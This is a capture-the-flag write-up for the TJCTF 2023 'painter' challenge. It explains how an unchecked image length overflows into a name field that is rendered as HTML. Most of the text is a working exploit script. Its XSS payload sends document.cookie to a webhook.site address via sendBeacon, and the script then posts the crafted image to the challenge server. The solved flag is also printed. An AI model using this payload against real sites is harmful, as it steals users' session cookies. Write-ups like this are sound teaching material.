# TJCTF 2023 - Pwn - painter

First, there is the code that might be able to do XSS.
But the length of name must be less than 8, so it is not possible by itself.

```js
const setName = () => {
    const name = UTF8ToString(_getName());
    document.getElementById('name-h1').innerHTML = name;
}
```

On the other hand, the absence of checks allows us to save images that contain longer data than they should be.
If such images are loaded, a problem (possibly like BOF) occurs.

After trying various inputs, I found that somehow part of the image was written into the name.
This makes XSS possible.

The code to create an exploit image is below:

```js
const N = 512;
const n = 12288 + N;
const k = new Uint8Array(n).fill(0);

for(let j = 0; j < 3; ++j) {
    for(let i = 0; i < 32 * 32; ++i) {
        k.set([0x61 + i, 0x61 + i, 0x61 + i, 0x61 + i], i * 4 + (32*32*4)*j);
    }
}

for(let i = 0; i < 32 * 32; ++i) {
    k.set([0x31, 0x41 + i, 0x30, 0], i * 4 + (32*32*4));
}
k.set(Array.from("aaaa", c => c.charCodeAt(0)), (32*32*4));

k.set(Array.from("<img src='' onerror='if(!window.p){window.p=1; navigator.sendBeacon(`https://webhook.site/xxxxxxxx/${document.cookie}`)}'>", c => c.charCodeAt(0)));

const o = new Uint8Array(N);
o.set([8, 0x10, 1, 0], 0);
k.set(o, 12288);

fetch("https://painter.tjc.tf/save", {
    "headers": {
        "content-type": "application/json",
    },
    "body": JSON.stringify({ name: "test", img: btoa(String.fromCharCode(...k)) }),
    "method": "POST",
});
```

Since `setName` seems to be called many times, I created a guard so that my code would be executed only once.

Flag: `tjctf{m0n4_l1s4_1s_0verr4t3d_e2187c9a}`
